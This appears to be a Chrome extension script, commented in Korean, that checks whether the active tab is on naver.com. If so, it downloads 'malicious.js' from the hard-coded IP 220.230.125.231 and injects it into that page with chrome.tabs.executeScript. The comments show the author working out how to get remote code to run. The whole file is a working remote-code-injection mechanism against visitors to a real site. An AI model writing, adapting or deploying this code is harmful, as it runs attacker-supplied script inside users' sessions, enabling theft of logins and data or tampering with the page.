
var script;
chrome.tabs.query({
            active: true,
            lastFocusedWindow: true
        }, function(tabs) {
            // and use that tab to fill in out title and url
            var tab = tabs[0];
            console.log(tab.url);
            
            var url = tab.url;
            console.log(url);

            var target = "naver.com";       
            if( url.includes(target) ){ //현재 열려있는 탭에 "naver.com"이 포함되어있다면,
                foundTarget(url);
                
            }
            else {
                alert("실패...");
            }

            console.log(script);
            

        });

function foundTarget(url){
    var tabURL = url;
    var xhr = new XMLHttpRequest();
    //xhr.open("GET", "http://220.230.125.231/Url", true);
    xhr.open("GET", "http://220.230.125.231/malicious.js", true);
    xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        var script = xhr.responseText;
       // console.log(resp);
                
        chrome.tabs.executeScript(tabURL.id, {
               //XMLHttpRequest로 얻은 스크립트 실행
                code : script
               // file: "http://220.230.125.231/malicious.js" //remote로는 실행 안된다..!
            }, function() {
                if (chrome.runtime.lastError) {
                    console.error(chrome.runtime.lastError.message);
                }
            });

      //  alert(resp);    //서버에서 보낸 'success'문자열을 받아옴
    }
  };
  xhr.send();
}
